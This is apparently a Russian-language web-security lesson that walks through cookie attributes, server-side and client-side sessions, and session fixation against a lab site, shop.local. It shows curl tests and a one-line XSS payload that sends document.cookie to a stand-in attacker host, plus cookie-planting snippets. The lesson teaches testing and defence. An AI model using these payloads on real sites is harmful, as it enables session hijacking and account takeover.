В прошлом уроке мы видели: HTTP — протокол без состояния, сервер не помнит предыдущие запросы. Но после логина сайт всё-таки узнаёт тебя на каждой странице. Как? За это отвечают **cookie** и **сессии**. Почти любая уязвимость авторизации начинается именно здесь.

В этом уроке мы возьмём `shop.local` и проследим **один** логин: как сервер заводит сессию, какие атрибуты ставит и что ломается, если он забыл их выставить.

## Наш пример: логин в shop.local

Залогинимся через curl, сохраняя cookie в файл:

```bash
$ curl -s -i -c jar.txt -X POST 'https://shop.local/login' \
    -d 'username=admin&password=admin'
HTTP/1.1 302 Found
Location: /account
Set-Cookie: session=9f2c8a1b; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
```

Ответ `302 Found` — «перенаправляю на `/account`». А главное — заголовок `Set-Cookie`: сервер выдал нам **cookie** с именем `session` и случайным значением `9f2c8a1b`. Файл `jar.txt` теперь хранит эту cookie. Проверим, что с ней мы «внутри»:

```bash
$ curl -s -b jar.txt 'https://shop.local/account' | grep -o 'Добро пожаловать, [^<]*'
Добро пожаловать, admin
```

Вот и вся магия: браузер (или curl) возвращает cookie в каждом запросе, а сервер по ней узнаёт пользователя.

## Шаг 1: cookie — это пара имя=значение плюс атрибуты

**Cookie** — небольшая пара `имя=значение`, которую сервер отправляет заголовком `Set-Cookie`, а клиент возвращает заголовком `Cookie`. Но у cookie есть **атрибуты** — настройки, и они определяют её безопасность:

| Атрибут | Смысл | Что будет без него |
|---------|-------|--------------------|
| `HttpOnly` | JS не может прочитать cookie | XSS сразу крадёт сессию |
| `Secure` | cookie шлётся только по HTTPS | кража по HTTP (перехват) |
| `SameSite` | не отправлять cookie в чужих кросс-сайтовых запросах | CSRF-запросы проходят |
| `Domain` | для каких доменов cookie действует | слишком широкий → утечка на поддомен |
| `Path` | для каких путей | шире нужного → лишняя экспозиция |
| `Max-Age` | время жизни | «вечная» сессия без ротации |

У нас `HttpOnly; Secure; SameSite=Lax` — хороший набор. А теперь «плохой» случай, который встречается в реальных приложениях:

```bash
$ curl -s -I 'https://shop.local/login' | grep -i set-cookie
set-cookie: session=9f2c8a1b; Path=/
```

Здесь нет ни `HttpOnly`, ни `Secure`, ни `SameSite`. Это три отдельные находки: XSS сможет прочитать сессию, сеть — перехватить, а чужой сайт — отправить запрос от твоего имени.

## Шаг 2: серверная сессия против клиентской

Важно понимать, **где живут данные** сессии.

- **Серверная сессия.** Cookie содержит только случайный идентификатор (128+ бит). Сами данные (кто ты, твоя роль) лежат на сервере. Подделать содержимое нельзя — клиент видит лишь ключ.
- **Клиентская сессия.** В cookie лежит подписанный токен со всеми данными (JWT, Flask-session). Данные у клиента, сервер только проверяет подпись. Опасность — слабый секрет подписи или «alg: none».

У нас `session=9f2c8a1b` — похоже на серверную сессию: короткое случайное значение. Значит, чтобы выдать себя за другого, нужно угадать или украсть чужой идентификатор.

Ключевая мысль урока: **идентификатор сессии — это и есть пароль.** Кто знает твою сессионную cookie, тот ты.

## Шаг 3: проверяем ротацию — главный тест

Нормальный поток: до логина у тебя анонимная сессия, а **после логина сервер обязан выдать новый** идентификатор. Если не выдал — возникает **фиксация сессии**.

Проверим наш `shop.local` — меняется ли `session` при логине:

```bash
# 1. получаем анонимную cookie
$ curl -s -i 'https://shop.local/' | grep -i 'set-cookie'
Set-Cookie: session=ANON123; Path=/

# 2. логинимся, передав эту же cookie
$ curl -s -i -b 'session=ANON123' -X POST 'https://shop.local/login' \
    -d 'username=admin&password=admin' | grep -i 'set-cookie'
Set-Cookie: session=ANON123; Path=/
```

Значение **не изменилось** — `ANON123` остался. Это уязвимо. Вот атака целиком:

1. Атакующий заходит на сайт и получает анонимный `session=ANON123`.
2. Навязывает его жертве — ссылкой `https://shop.local/login?session=ANON123`, либо через XSS (`document.cookie = 'session=ANON123'`), либо с поддомена.
3. Жертва логинится — сервер оставляет тот же `ANON123`.
4. Атакующий приходит с `ANON123` — и он уже внутри аккаунта жертвы.

Если бы сервер после логина выдал новое значение, шаг 4 вернул бы форму логина. Защита — регенерация ID при входе (в PHP это `session_regenerate_id(true)`).

## Шаг 4: кража через XSS и поддомен

Два смежных вектора, которые стоит проверить на любой цели.

**XSS + отсутствие `HttpOnly`.** Если cookie доступна из JS, а на странице есть XSS, то:

```html
<script>fetch('https://attacker.example/?c='+document.cookie)</script>
```

Сервер атакующего в логе увидит `session=...` и переиспользует его. Именно поэтому `HttpOnly` — обязательный минимум.

**Поддомен с широким `Domain`.** Если cookie выставлена как `Domain=.shop.local`, то любой поддомен может поставить её для основного сайта:

```js
document.cookie = "session=ATTACKER; domain=.shop.local; path=/";
```

Скомпрометированный поддомен (или subdomain takeover) так «подбрасывает» чужую сессию. Защита — не ставить широкий `Domain` и использовать префикс `__Host-`, который запрещает установку с поддомена.

## Шаг 5: опасные комбинации атрибутов

Разберём, что именно ломает каждая настройка:

| Настройка | Что открывает |
|-----------|---------------|
| нет `HttpOnly` | XSS читает cookie через `document.cookie` |
| нет `Secure` | перехват по HTTP (публичный Wi-Fi) |
| `SameSite=None` без причины | CSRF-запросы проходят |
| широкий `Domain` | поддомен с XSS читает cookie |
| нет ротации при логине | фиксация сессии |
| нет инвалидации при logout | украденная сессия живёт |

Проверить все cookie сразу:

```bash
$ curl -s -I 'https://shop.local/' | grep -i '^set-cookie'
set-cookie: session=...; Path=/; HttpOnly; Secure; SameSite=Lax
```

Если в строке нет `HttpOnly`/`Secure`/`SameSite` — это уже три отдельные находки.

## Что мы теперь знаем

- Cookie — пара `имя=значение` плюс атрибуты; клиент возвращает её в каждом запросе.
- `HttpOnly`/`Secure`/`SameSite` — минимальный набор защиты; их отсутствие = находка.
- Сессия бывает серверной (в cookie только случайный ID) и клиентской (в cookie данные + подпись).
- Идентификатор сессии = пароль; главный тест — **меняется ли он после логина**.
- Нет ротации → фиксация сессии → захват аккаунта.

## На что смотреть дальше

- **Предсказуемые id.** Если `session` — это `md5(username)` или последовательный счётчик, его можно угадать.
- **Session puzzling.** Одна переменная сессии используется для разных целей (регистрация и сброс пароля) — состояния путаются.
- **Ротация при смене пароля/роли.** id должен меняться и там, а не только при логине.

## Куда дальше

Мы разобрали, как сервер узнаёт тебя и как это ломается. Теперь логичный вопрос: а почему скрипт с чужого сайта не может просто прочитать твой ответ? За это отвечает Same-Origin Policy и CORS — о них в следующем уроке. А пока запомни: **сессионная cookie — это пропуск; проверяй её атрибуты и ротацию ID после логина.**

## Где пригодится

- **CTF (Web):** почти в каждой auth-задаче ты подбираешь или подделываешь cookie; фиксация и предсказуемые id — частые «изюминки».
- **Bug bounty:** отсутствие `HttpOnly`/`Secure`/`SameSite`, слабая ротация сессии — валидные находки с понятным impact.
- **Пентест:** анализ атрибутов cookie и поведения сессии — обязательный пункт чек-листа аутентификации.
- **Работа (AppSec/Dev):** настройка сессий и cookie — базовая гигиена, которую ты будешь ревьюить в каждом проекте.
